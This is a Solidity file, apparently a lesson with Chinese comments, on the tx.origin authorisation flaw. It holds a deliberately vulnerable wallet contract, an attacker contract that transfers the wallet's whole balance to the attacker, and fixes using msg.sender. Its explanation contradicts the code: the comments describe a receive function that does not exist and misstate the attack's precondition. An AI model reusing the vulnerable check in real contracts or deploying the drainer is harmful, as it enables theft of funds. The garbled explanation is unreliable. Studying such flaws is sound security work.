// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*
攻击原理：通过 receive 函数调用 TxUserWallet 的 transferTo 函数，利用 tx.origin 的漏洞绕过权限检查。
攻击流程：
1、部署 TxUserWallet 合约：假设 TxUserWallet 合约已经部署，并且合约中有一定数量的 ETH。
2、部署 TxAttackWallet 合约：攻击者部署 TxAttackWallet 合约
3、攻击者调用 TxAttackWallet 合约的 receive 函数
   攻击者向 TxAttackWallet 合约发送一定数量的 ETH，触发 receive 函数。
   在 receive 函数中，TxAttackWallet 合约调用 TxUserWallet 合约的 transferTo 函数
4、绕过权限检查：
   在 TxUserWallet 合约的 transferTo 函数中，tx.origin 是攻击者的地址（外部账户），而不是 TxAttackWallet 合约的地址
   如果攻击者的地址是 TxUserWallet 合约的 owner，权限检查将通过。
5、转移资金：
   TxUserWallet 合约将余额转移到 TxAttackWallet 合约的 owner 地址（即攻击者地址）。
 */

/*/////////////////////////////////////////////
                   被攻击合约 
/////////////////////////////////////////////*/
contract TxUserWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint256 amount) public {
        // 错误就在这里，必须使用 msg.sender 而不是 tx.origin。
        require(tx.origin == owner);
        dest.transfer(amount);
    }
}

/*/////////////////////////////////////////////
                   攻击合约 
/////////////////////////////////////////////*/
contract TxAttackWallet {
    address payable owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function attack(address payable target) public {
        // 调用 TxUserWallet 的 transferTo 函数
        TxUserWallet(target).transferTo(owner, target.balance);
    }
}

/**
 * 攻击者向 TxAttackWallet 合约发送 ETH
 * (bool success,) = address(attackWallet).call{value: 1 ether}("");
 * require(success, "Transfer failed");
 *
 * TxAttackWallet 合约的 receive 函数被调用，触发对 TxUserWallet 合约的 transferTo 函数的调
 * 由于 tx.origin 是攻击者的地址，权限检查通过，TxUserWallet 合约的余额被转移到攻击者地址
 */

/*
  修复意见：

使用 msg.sender 代替 tx.origin
msg.sender 是直接调用者（可能是合约地址），而 tx.origin 是交易的发起者（外部账户地址）。在权限检查中，应使用 msg.sender 而不是 tx.origin
 contract TxUserWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    function transferTo(address payable dest, uint256 amount) public {
        require(msg.sender == owner, "Not owner"); // 使用 msg.sender，修复安全漏洞
        dest.transfer(amount);
    }
}

添加 onlyOwner 修饰器

contract TxUserWallet {
    address owner;

    constructor() {
        owner = msg.sender;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "Not owner");
        _;
    }

    function transferTo(address payable dest, uint256 amount) public onlyOwner {
        dest.transfer(amount);
    }
}
 */
